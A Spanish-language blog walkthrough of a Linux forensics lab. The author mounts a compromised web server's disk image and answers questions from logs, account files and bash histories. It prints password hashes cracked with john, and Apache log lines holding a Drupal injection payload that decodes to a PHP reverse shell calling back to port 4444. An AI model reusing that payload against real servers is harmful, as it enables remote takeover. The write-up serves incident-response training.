---
layout: single
title: Cyberdefenders - Hacked
excertp: Análisis forense en un entorno linux en el que se pone a prueba conocimientos básicos de este sistema operativo. 
date: 2025-05-21
classes: wide
header:
  teaser: ../assets/images/sherlock-bumbleebe/
  teaser_home_page: true
  icon: ../assets/images/logo-icon.svg
categories:
   - cyberdefenders
   - DFIR
   - network forensics
   - linux
tags:
   - ftk imager
   - bash
   - john 
   - mounting disk image on linux
---

Esto se puede hacer fácilmente con `FTK imager`, pero me resulta más cómodo hacerlo por terminal para este laboratorio. 



```bash
┌──(kali㉿kali)-[~/blue-labs/hacked/temp_extract_dir]
└─$ sudo ewfmount Webserver.E01 /mnt/hacked
ewfmount 20140816


┌──(kali㉿kali)-[~/blue-labs/hacked/temp_extract_dir]
└─$ sudo mmls /mnt/hacked/ewf1
DOS Partition Table
Offset Sector: 0
Units are in 512-byte sectors

      Slot      Start        End          Length       Description
000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)
001:  -------   0000000000   0000002047   0000002048   Unallocated
002:  000:000   0000002048   0000499711   0000497664   Linux (0x83)
003:  -------   0000499712   0000501759   0000002048   Unallocated
004:  Meta      0000501758   0066064383   0065562626   DOS Extended (0x05)
005:  Meta      0000501758   0000501758   0000000001   Extended Table (#1)
006:  001:000   0000501760   0066064383   0065562624   Linux Logical Volume Manager (0x8e)
007:  -------   0066064384   0066064607   0000000224   Unallocated

┌──(kali㉿kali)-[~/blue-labs/hacked/temp_extract_dir]
└─$ sudo losetup -rf -o $((501760 * 512)) /mnt/hacked/ewf1

┌──(kali㉿kali)-[~/blue-labs/hacked/temp_extract_dir]
└─$ sudo losetup -a
/dev/loop0: [0055]:2 (/mnt/hacked/ewf1), offset 256901120

┌──(kali㉿kali)-[~/blue-labs/hacked/temp_extract_dir]
└─$ sudo file -s /dev/loop0
/dev/loop0: LVM2 PV (Linux Logical Volume Manager), UUID: SA3YAl-91Rk-W5FA-cQGz-TnXl-J4yN-awbQjd, size: 33568063488

┌──(kali㉿kali)-[~/blue-labs/hacked/temp_extract_dir]
└─$ sudo pvdisplay /dev/loop0
  WARNING: PV /dev/loop0 in VG VulnOSv2-vg is using an old PV header, modify the VG to update.
  --- Physical volume ---
  PV Name               /dev/loop0
  VG Name               VulnOSv2-vg
  PV Size               31.26 GiB / not usable 0
  Allocatable           yes (but full)
  PE Size               4.00 MiB
  Total PE              8003
  Free PE               0
  Allocated PE          8003
  PV UUID               SA3YAl-91Rk-W5FA-cQGz-TnXl-J4yN-awbQjdi


┌──(kali㉿kali)-[~/blue-labs/hacked/temp_extract_dir]
└─$ sudo vgscan
  WARNING: PV /dev/loop0 in VG VulnOSv2-vg is using an old PV header, modify the VG to update.
  Found volume group "VulnOSv2-vg" using metadata type lvm2

┌──(kali㉿kali)-[~/blue-labs/hacked/temp_extract_dir]
└─$ sudo lvchange -a y VulnOSv2-vg

┌──(kali㉿kali)-[~/blue-labs/hacked/temp_extract_dir]
└─$ sudo lvscan
  WARNING: PV /dev/loop0 in VG VulnOSv2-vg is using an old PV header, modify the VG to update.
  ACTIVE            '/dev/VulnOSv2-vg/root' [30.51 GiB] inherit
  ACTIVE            '/dev/VulnOSv2-vg/swap_1' [768.00 MiB] inherit

┌──(kali㉿kali)-[~/blue-labs/hacked/temp_extract_dir]
└─$ sudo fsstat /dev/VulnOSv2-vg/root |head
FILE SYSTEM INFORMATION
--------------------------------------------
File System Type: Ext4
Volume Name:
Volume ID: 46c34db340bee5aa35423fd055183259

Last Written at: 2019-10-05 05:41:50 (EDT)
Last Checked at: 2016-04-03 12:05:48 (EDT)

Last Mounted at: 2019-10-05 05:41:50 (EDT)
```


En caso de haber errores: 
```bash 
#1
sudo mount -t ext2 -o ro,noexec,loop,offset=$((2048*512)) /mnt/hacked/ewf1 /mnt/server/boot
mount: /mnt/server/boot: overlapping loop device exists for /mnt/ewf_mount/ewf1.
#2
sudo losetup -rf -o $((2048 * 512)) /mnt/hacked/ewf1
sudo mount -t ext2 -o ro,noexec  /dev/loop25  /mnt/server/boot
```

Con todo esto, ya podemos pasar a las preguntas:

<h3 style="color: #0d6efd;">Q1. ¿Cuál es la zona horaria del sistema? </h3>

```bash 
┌──(root㉿kali)-[/mnt]
└─# cat /mnt/server/data/etc/timezone
Europe/Brussels
```

---

<h3 style="color: #0d6efd;">Q2. ¿Quién fue el último usuario que se conectó al sistema? </h3>

Podemos verlo en el fichero `auth.log`

o con el siguiente, pero me da un error:

```bash 
last -f wtmp
```

Podemos hacer lo siguiente: 
```bash
┌──(root㉿kali)-[/mnt/server/data/var/log]
└─# who wtmp | tail -n 1
mail     pts/1        2019-10-05 07:23 (192.168.210.131)
```

---

<h3 style="color: #0d6efd;">Q3 ¿Cuál era el puerto de origen desde el que se conectaba el usuario 'mail'? </h3>

Podemos verlo en el fichero `auth.log`

```bash 
┌──(root㉿kali)-[/mnt/server/data/var/log]
└─# tail -n 13 auth.log
Oct  5 13:21:45 VulnOSv2 sshd[3048]: Received disconnect from 192.168.210.131: 11: disconnected by user
Oct  5 13:21:45 VulnOSv2 sshd[2999]: pam_unix(sshd:session): session closed for user mail
Oct  5 13:23:34 VulnOSv2 sshd[3108]: Accepted password for mail from 192.168.210.131 port 57708 ssh2
Oct  5 13:23:34 VulnOSv2 sshd[3108]: pam_unix(sshd:session): session opened for user mail by (uid=0)
Oct  5 13:23:39 VulnOSv2 sudo:     mail : TTY=pts/1 ; PWD=/var/mail ; USER=root ; COMMAND=/bin/su -
Oct  5 13:23:39 VulnOSv2 sudo: pam_unix(sudo:session): session opened for user root by mail(uid=0)
Oct  5 13:23:39 VulnOSv2 su[3164]: Successful su for root by root
Oct  5 13:23:39 VulnOSv2 su[3164]: + /dev/pts/1 root:root
Oct  5 13:23:39 VulnOSv2 su[3164]: pam_unix(su:session): session opened for user root by mail(uid=0)
Oct  5 13:24:09 VulnOSv2 su[3164]: pam_unix(su:session): session closed for user root
Oct  5 13:24:09 VulnOSv2 sudo: pam_unix(sudo:session): session closed for user root
Oct  5 13:24:11 VulnOSv2 sshd[3156]: Received disconnect from 192.168.210.131: 11: disconnected by user
Oct  5 13:24:11 VulnOSv2 sshd[3108]: pam_unix(sshd:session): session closed for user mail
```

---

<h3 style="color: #0d6efd;">Q4. ¿Cuánto duró la última sesión del usuario "mail"? (Sólo minutos) </h3>

También podemos verlo en el `auth.log`

```bash 
┌──(root㉿kali)-[/mnt/server/data/var/log]
└─# tail -n 8 auth.log
Oct  5 13:23:39 VulnOSv2 sudo: pam_unix(sudo:session): session opened for user root by mail(uid=0)
Oct  5 13:23:39 VulnOSv2 su[3164]: Successful su for root by root
Oct  5 13:23:39 VulnOSv2 su[3164]: + /dev/pts/1 root:root
Oct  5 13:23:39 VulnOSv2 su[3164]: pam_unix(su:session): session opened for user root by mail(uid=0)
Oct  5 13:24:09 VulnOSv2 su[3164]: pam_unix(su:session): session closed for user root
Oct  5 13:24:09 VulnOSv2 sudo: pam_unix(sudo:session): session closed for user root
Oct  5 13:24:11 VulnOSv2 sshd[3156]: Received disconnect from 192.168.210.131: 11: disconnected by user
Oct  5 13:24:11 VulnOSv2 sshd[3108]: pam_unix(sshd:session): session closed for user mail
```

---

<h3 style="color: #0d6efd;">Q5. ¿Qué servicio del servidor utilizó el último usuario para iniciar sesión en el sistema? </h3>

Vemos que el servicio es por `sshd`: 
```bash 
Oct  5 13:24:11 VulnOSv2 sshd[3156]: Received disconnect from 192.168.210.131: 11: disconnected by user
```

---

<h3 style="color: #0d6efd;">Q6. ¿Qué tipo de ataque de autenticación se realizó contra la máquina objetivo? </h3>

Para esto podemos fijarnos en el siguiente comando: 
```bash 
┌──(root㉿kali)-[/mnt/server/data/var/log]
└─# grep sshd auth.log | grep -v pam_unix | wc -l
1436
```

pam_unix(sshd:session) se refiere al módulo de autenticación PAM (Pluggable Authentication Modules) específico que se está utilizando para gestionar la sesión de sshd, el servicio SSH.

---

<h3 style="color: #0d6efd;">Q7. ¿Cuántas direcciones IP aparecen en el archivo "/var/log/lastlog"?</h3>

Podemos hacerlo con `strings`: 
```bash 
┌──(root㉿kali)-[/mnt/server/data/var/log]
└─# strings lastlog
'3*Wtty1
]pts/1
192.168.210.131
2*Wpts/0
192.168.56.101
)Wtty1
```

Siendo más precisos: 
```bash 
┌──(root㉿kali)-[/mnt/server/data/var/log]
└─# strings lastlog |  grep -E '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+'
192.168.210.131
192.168.56.101
```

---

<h3 style="color: #0d6efd;">Q8. ¿Cuántos usuarios tienen un intérprete de comandos de inicio de sesión?</h3>

Podemos leer el fichero `/etc/passwd`

```bash 
┌──(root㉿kali)-[/]
└─# cat /mnt/server/data/etc/passwd | grep "\/bin\/bash"
root:x:0:0:root:/root:/bin/bash
mail:x:8:8:mail:/var/mail:/bin/bash
php:x:999:999::/usr/php:/bin/bash
vulnosadmin:x:1000:1000:vulnosadmin,,,:/home/vulnosadmin:/bin/bash
postgres:x:107:116:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash

┌──(root㉿kali)-[/]
└─# cat /mnt/server/data/etc/passwd | grep "\/bin\/bash" | wc -l
5
```

---

<h3 style="color: #0d6efd;">Q9. ¿Cuál es la contraseña del usuario de correo? </h3>

El hash lo encontramos en el `/etc/shadow`: 
```bash 
┌──(root㉿kali)-[/mnt]
└─# cat server/data/etc/shadow
root:$6$FUG2g0oZ$KSa0C5cB4IZKYUxSAlTHW3XpUXLNaZZOcMzw5Vj0t3JEVZ9rHMPmsWUkWSxV.c4FnOEt.BCW/e7GWQZyNLbXD.:16923:0:99999:7:::
daemon:*:16176:0:99999:7:::
bin:*:16176:0:99999:7:::
sys:*:16176:0:99999:7:::
sync:*:16176:0:99999:7:::
games:*:16176:0:99999:7:::
man:*:16176:0:99999:7:::
lp:*:16176:0:99999:7:::
mail:$6$zLaoLV8N$BNxYZUxvXiZwb3UjBhCxnxd9Mb02DDUF.GfMj1kbLB.s/quBVtMM4QjfOvmZvfqeh7BuLXaRvRSfpQgNI5prE.:18174:0:99999:7:::
<SNIP>
```

---

<h3 style="color: #0d6efd;">Q9. ¿Cuál es la contraseña del usuario de correo?</h3>

Podemos mezclar el shadow y el passwd: 
```bash 
┌──(root㉿kali)-[/mnt]
└─# unshadow /mnt/server/data/etc/passwd /mnt/server/data/etc/shadow > unshadow
```

Usamos john para obtener la contraseña: 
```bash 
┌──(root㉿kali)-[/mnt]
└─# john -w:/usr/share/wordlists/rockyou.txt unshadow
Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
forensics        (php)
forensics        (mail)
```

---

<h3 style="color: #0d6efd;">Q10. ¿Qué cuenta de usuario fue creada por el atacante? </h3>

Esto podemos verlo en dos ficheros distintos, en el historial de bash o en `auth.log`: 

```bash 
┌──(root㉿kali)-[/mnt]
└─# grep "useradd" server/data/var/log/auth.log
Apr  3 19:02:51 VulnOSv2 useradd[12084]: new user: name=mysql, UID=104, GID=113, home=/nonexistent, shell=/bin/false
Apr 16 15:09:24 VulnOSv2 sudo: vulnosadmin : TTY=tty1 ; PWD=/home/vulnosadmin ; USER=root ; COMMAND=/usr/sbin/useradd webmin -m
Apr 16 15:09:24 VulnOSv2 useradd[1275]: new group: name=webmin, GID=1001
Apr 16 15:09:24 VulnOSv2 useradd[1275]: new user: name=webmin, UID=1001, GID=1001, home=/home/webmin, shell=
Apr 16 15:10:23 VulnOSv2 useradd[1890]: new user: name=sshd, UID=105, GID=65534, home=/var/run/sshd, shell=/usr/sbin/nologin
Apr 16 15:10:58 VulnOSv2 useradd[2850]: new user: name=postfix, UID=106, GID=114, home=/var/spool/postfix, shell=/bin/false
Apr 25 21:02:23 VulnOSv2 useradd[2785]: new user: name=postgres, UID=107, GID=116, home=/var/lib/postgresql, shell=/bin/bash
Oct  5 13:06:38 VulnOSv2 sudo:     root : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/sbin/userad -d /usr/php -m --system --shell /bin/bash --skel /etc/skel -G sudo php
Oct  5 13:06:38 VulnOSv2 useradd[2525]: new group: name=php, GID=999
Oct  5 13:06:38 VulnOSv2 useradd[2525]: new user: name=php, UID=999, GID=999, home=/usr/php, shell=/bin/bash
Oct  5 13:06:38 VulnOSv2 useradd[2525]: add 'php' to group 'sudo'
Oct  5 13:06:38 VulnOSv2 useradd[2525]: add 'php' to shadow group 'sudo'
```

```bash 
┌──(root㉿kali)-[/mnt]
└─# cat server/data/var/spool/mail/.bash_history
sudo su -
w
ll
ls -l
ls -la
pwd
logout
w
last
sudo su -
logout
sudo su -
passwd php
sudo su -
logout
sudo su -
logout
```


---

<h3 style="color: #0d6efd;">Q11. ¿Cuántos grupos de usuarios existen en la máquina? </h3>

Esto se encuentra en la siguiente ruta: 
```bash 
┌──(root㉿kali)-[/mnt]
└─# head -n 10 server/data/etc/group
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog,vulnosadmin
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
```

Contamos los grupos:
```bash 
┌──(root㉿kali)-[/mnt]
└─# wc -l  server/data/etc/group
58 server/data/etc/group
```

---

<h3 style="color: #0d6efd;">Q12. ¿Cuántos usuarios tienen acceso sudo? </h3>

```bash
┌──(root㉿kali)-[/mnt]
└─# grep "sudo" server/data/etc/group
sudo:x:27:php,mail
```

---

<h3 style="color: #0d6efd;">Q13. ¿Cuál es el directorio raíz del usuario PHP? </h3>

Lo podemos ver en la siguiente línea:
```bash 
COMMAND=/usr/sbin/use    rad -d /usr/php -m --system --shell /bin/bash --skel /etc/skel -G sudo php
```

---

<h3 style="color: #0d6efd;">Q14. ¿Qué comando utilizó el atacante para obtener privilegios de root? (La respuesta contiene dos espacios). </h3>

Lo primero que podemos pensar, viendo el patrón de la respuesta, podemos concluir que se trata de `sudo su -`

Podemos confirmarlo en el `.bash_history` y en e `auth.log`

```bash 
┌──(root㉿kali)-[/mnt]
└─# cat server/data/var/spool/mail/.bash_history
sudo su -
w
ll
ls -l
ls -la
pwd
logout
w
last
sudo su -
logout
sudo su -
passwd php
sudo su -
logout
sudo su -
logout
```

---

<h3 style="color: #0d6efd;">Q15. ¿Qué fichero ha borrado el usuario 'root'? </h3>

Bien, ya sabemos que el usuario tiene permisos de root, así que podemos buscar en el historial de este usuario: 

```bash 
┌──(root㉿kali)-[/mnt]
└─# grep "rm" server/data/root/.bash_history
rm 37292.c
```

---

<h3 style="color: #0d6efd;">Q16. Recupera el archivo eliminado, ábrelo y extrae el nombre del autor del exploit. </h3>

Para esto podemos buscar en `exploit-db`, buscando por [37292](https://www.exploit-db.com/exploits/37292)

Podemos confirmar con el siguiente comando: 
```bash 
┌──(root㉿kali)-[/mnt]
└─# sudo grep -rai '37292\.c' -A20 -B20  /dev/mapper/VulnOSv2--vg-root  |strings

<SNIP>
```

---

<h3 style="color: #0d6efd;">Q17. ¿Cuál es el sistema de gestión de contenidos (CMS) instalado en la máquina? </h3>

Un **CMS (Content Management System)** o **Sistema de Gestión de Contenidos** es una aplicación web que permite crear, administrar y modificar contenido digital fácilmente, **sin necesidad de programar**.

Un CMS te permite:

* Crear y editar páginas web.
* Administrar usuarios.
* Subir imágenes o archivos.
* Instalar plugins/extensiones.
* Cambiar el diseño sin tocar código.

### Ejemplos populares de CMS:

| CMS           | Descripción breve                              |
| ------------- | ---------------------------------------------- |
| **WordPress** | El más popular; usado para blogs y sitios web. |
| **Joomla**    | Más complejo que WordPress, pero flexible.     |
| **Drupal**    | Muy potente y seguro, usado en sitios grandes. |
| **Magento**   | Usado para e-commerce.                         |
| **Ghost**     | Enfocado en blogs y escritura.                 |

Lo podemos ver en `/etc`: 

O en la sigiente ruta: 
```bash 
┌──(root㉿kali)-[/mnt]
└─# cat /mnt/server/data/var/www/html/jabc/index.php
<?php

/**
 * @file
 * The PHP page that serves all page requests on a Drupal installation.
 *
 * The routines here dispatch control to the appropriate handler, which then
 * prints the appropriate page.
 *
 * All Drupal code is released under the GNU General Public License.
 * See COPYRIGHT.txt and LICENSE.txt.
 */

/**
 * Root directory of Drupal installation.
 */
define('DRUPAL_ROOT', getcwd());

require_once DRUPAL_ROOT . '/includes/bootstrap.inc';
drupal_bootstrap(DRUPAL_BOOTSTRAP_FULL);
menu_execute_active_handler();
```

---

<h3 style="color: #0d6efd;">Q18. ¿Cuál es la versión del CMS instalada en la máquina? </h3>

Podemos verlo en la siguiente ruta: 

```bash 
┌──(root㉿kali)-[/mnt]
└─# cat /mnt/server/data/var/www/html/jabc/modules/blog/blog.info
name = Blog
description = Enables multi-user blogs.
package = Core
version = VERSION
core = 7.x
files[] = blog.test

; Information added by Drupal.org packaging script on 2014-01-15
version = "7.26"
project = "drupal"
datestamp = "1389815930"
```

---
<h3 style="color: #0d6efd;">Q19. ¿Qué puerto estaba a la escucha para recibir la shell inversa del atacante? </h3>

Podemos aplicar el siguiente filtro, que usualmente se usan peticiones POST para inicial una shell.

```bash
┌──(root㉿kali)-[/mnt]
└─# cat /mnt/server/data/var/log/apache2/access.log | grep -i POST |tail -n4                      192.168.56.101 - - [04/May/2016:10:41:55 +0200] "POST /jabc/?q=admin%2Fstructure%2Fblock&render=overlay&render=overlay HTTP/1.1" 302 482 "http://192.168.56.102/jabc/?q=admin%2Fstructure%2Fblock&render=overlay" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:46.0) Gecko/20100101 Firefox/46.0"
192.168.210.131 - - [05/Oct/2019:13:01:27 +0200] "POST /jabc/?q=user/password&name%5b%23post_render%5d%5b%5d=assert&name%5b%23markup%5d=eval%28base64_decode%28Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzE5Mi4xNjguMjEwLjEzMSc7ICRwb3J0ID0gNDQ0NDsgaWYgKCgkZiA9ICdzdHJlYW1fc29ja2V0X2NsaWVudCcpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKCJ0Y3A6Ly97JGlwfTp7JHBvcnR9Iik7ICRzX3R5cGUgPSAnc3RyZWFtJzsgfSBpZiAoISRzICYmICgkZiA9ICdmc29ja29wZW4nKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZigkaXAsICRwb3J0KTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGlmICghJHMgJiYgKCRmID0gJ3NvY2tldF9jcmVhdGUnKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZihBRl9JTkVULCBTT0NLX1NUUkVBTSwgU09MX1RDUCk7ICRyZXMgPSBAc29ja2V0X2Nvbm5lY3QoJHMsICRpcCwgJHBvcnQpOyBpZiAoISRyZXMpIHsgZGllKCk7IH0gJHNfdHlwZSA9ICdzb2NrZXQnOyB9IGlmICghJHNfdHlwZSkgeyBkaWUoJ25vIHNvY2tldCBmdW5jcycpOyB9IGlmICghJHMpIHsgZGllKCdubyBzb2NrZXQnKTsgfSBzd2l0Y2ggKCRzX3R5cGUpIHsgY2FzZSAnc3RyZWFtJzogJGxlbiA9IGZyZWFkKCRzLCA0KTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRsZW4gPSBzb2NrZXRfcmVhZCgkcywgNCk7IGJyZWFrOyB9IGlmICghJGxlbikgeyBkaWUoKTsgfSAkYSA9IHVucGFj.aygiTmxlbiIsICRsZW4pOyAkbGVuID0gJGFbJ2xlbiddOyAkYiA9ICcnOyB3aGlsZSAoc3RybGVuKCRiKSA8ICRsZW4pIHsgc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRiIC49IGZyZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgY2FzZSAnc29ja2V0JzogJGIgLj0gc29ja2V0X3JlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOyB9IH0gJEdMT0JBTFNbJ21zZ3NvY2snXSA9ICRzOyAkR0xPQkFMU1snbXNnc29ja190eXBlJ10gPSAkc190eXBlOyBpZiAoZXh0ZW5zaW9uX2xvYWRlZCgnc3Vob3NpbicpICYmIGluaV9nZXQoJ3N1aG9zaW4uZXhlY3V0b3IuZGlzYWJsZV9ldmFsJykpIHsgJHN1aG9zaW5fYnlwYXNzPWNyZWF0ZV9mdW5jdGlvbignJywgJGIpOyAkc3Vob3Npbl9ieXBhc3MoKTsgfSBlbHNlIHsgZXZhbCgkYik7IH0gZGllKCk7%29%29%3b&name%5b%23type%5d=markup HTTP/1.1" 200 13983 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
192.168.210.131 - - [05/Oct/2019:13:01:27 +0200] "POST /jabc/?q=file/ajax/name/%23value/form-tggMqwbT3cRyS3SWuIRNGj_FB_5N-cux23-NHVF0NrA HTTP/1.1" 200 1977 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
192.168.210.131 - - [05/Oct/2019:13:01:29 +0200] "POST /jabc/?q=user/password&name%5b%23post_render%5d%5b%5d=passthru&name%5b%23markup%5d=php%20-r%20%27eval%28base64_decode%28Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzE5Mi4xNjguMjEwLjEzMSc7ICRwb3J0ID0gNDQ0NDsgaWYgKCgkZiA9ICdzdHJlYW1fc29ja2V0X2NsaWVudCcpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKCJ0Y3A6Ly97JGlwfTp7JHBvcnR9Iik7ICRzX3R5cGUgPSAnc3RyZWFtJzsgfSBpZiAoISRzICYmICgkZiA9ICdmc29ja29wZW4nKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZigkaXAsICRwb3J0KTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGlmICghJHMgJiYgKCRmID0gJ3NvY2tldF9jcmVhdGUnKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZihBRl9JTkVULCBTT0NLX1NUUkVBTSwgU09MX1RDUCk7ICRyZXMgPSBAc29ja2V0X2Nvbm5lY3QoJHMsICRpcCwgJHBvcnQpOyBpZiAoISRyZXMpIHsgZGllKCk7IH0gJHNfdHlwZSA9ICdzb2NrZXQnOyB9IGlmICghJHNfdHlwZSkgeyBkaWUoJ25vIHNvY2tldCBmdW5jcycpOyB9IGlmICghJHMpIHsgZGllKCdubyBzb2NrZXQnKTsgfSBzd2l0Y2ggKCRzX3R5cGUpIHsgY2FzZSAnc3RyZWFtJzogJGxlbiA9IGZyZWFkKCRzLCA0KTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRsZW4gPSBzb2NrZXRfcmVhZCgkcywgNCk7IGJyZWFrOyB9IGlmICghJGxlbikgeyBkaWUoKTsgfSAkYSA9IHVucGFj.aygiTmxlbiIsICRsZW4pOyAkbGVuID0gJGFbJ2xlbiddOyAkYiA9ICcnOyB3aGlsZSAoc3RybGVuKCRiKSA8ICRsZW4pIHsgc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRiIC49IGZyZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgY2FzZSAnc29ja2V0JzogJGIgLj0gc29ja2V0X3JlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOyB9IH0gJEdMT0JBTFNbJ21zZ3NvY2snXSA9ICRzOyAkR0xPQkFMU1snbXNnc29ja190eXBlJ10gPSAkc190eXBlOyBpZiAoZXh0ZW5zaW9uX2xvYWRlZCgnc3Vob3NpbicpICYmIGluaV9nZXQoJ3N1aG9zaW4uZXhlY3V0b3IuZGlzYWJsZV9ldmFsJykpIHsgJHN1aG9zaW5fYnlwYXNzPWNyZWF0ZV9mdW5jdGlvbignJywgJGIpOyAkc3Vob3Npbl9ieXBhc3MoKTsgfSBlbHNlIHsgZXZhbCgkYik7IH0gZGllKCk7%29%29%3b%27&name%5b%23type%5d=markup HTTP/1.1" 200 14021 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
``` 

Decodificamos:

```bash 
┌──(root㉿kali)-[/mnt]
└─# echo "Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzE5Mi4xNjguMjEwLjEzMSc7ICRwb3J0ID0gNDQ0NDsgaWYgKCgkZiA9ICdzdHJlYW1fc29ja2V0X2NsaWVudCcpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKCJ0Y3A6Ly97JGlwfTp7JHBvcnR9Iik7ICRzX3R5cGUgPSAnc3RyZWFtJzsgfSBpZiAoISRzICYmICgkZiA9ICdmc29ja29wZW4nKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZigkaXAsICRwb3J0KTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGlmICghJHMgJiYgKCRmID0gJ3NvY2tldF9jcmVhdGUnKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZihBRl9JTkVULCBTT0NLX1NUUkVBTSwgU09MX1RDUCk7ICRyZXMgPSBAc29ja2V0X2Nvbm5lY3QoJHMsICRpcCwgJHBvcnQpOyBpZiAoISRyZXMpIHsgZGllKCk7IH0gJHNfdHlwZSA9ICdzb2NrZXQnOyB9IGlmICghJHNfdHlwZSkgeyBkaWUoJ25vIHNvY2tldCBmdW5jcycpOyB9IGlmICghJHMpIHsgZGllKCdubyBzb2NrZXQnKTsgfSBzd2l0Y2ggKCRzX3R5cGUpIHsgY2FzZSAnc3RyZWFtJzogJGxlbiA9IGZyZWFkKCRzLCA0KTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRsZW4gPSBzb2NrZXRfcmVhZCgkcywgNCk7IGJyZWFrOyB9IGlmICghJGxlbikgeyBkaWUoKTsgfSAkYSA9IHVucGFj.aygiTmxlbiIsICRsZW4pOyAkbGVuID0gJGFbJ2xlbiddOyAkYiA9ICcnOyB3aGlsZSAoc3RybGVuKCRiKSA8ICRsZW4pIHsgc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRiIC49IGZyZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgY2FzZSAnc29ja2V0JzogJGIgLj0gc29ja2V0X3JlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOyB9IH0gJEdMT0JBTFNbJ21zZ3NvY2snXSA9ICRzOyAkR0xPQkFMU1snbXNnc29ja190eXBlJ10gPSAkc190eXBlOyBpZiAoZXh0ZW5zaW9uX2xvYWRlZCgnc3Vob3NpbicpICYmIGluaV9nZXQoJ3N1aG9zaW4uZXhlY3V0b3IuZGlzYWJsZV9ldmFsJykpIHsgJHN1aG9zaW5fYnlwYXNzPWNyZWF0ZV9mdW5jdGlvbignJywgJGIpOyAkc3Vob3Npbl9ieXBhc3MoKTsgfSBlbHNlIHsgZXZhbCgkYik7IH0gZGllKCk7" | base64 -d
/*<?php /**/ error_reporting(0); $ip = '192.168.210.131'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpacbase64: invalid input
```


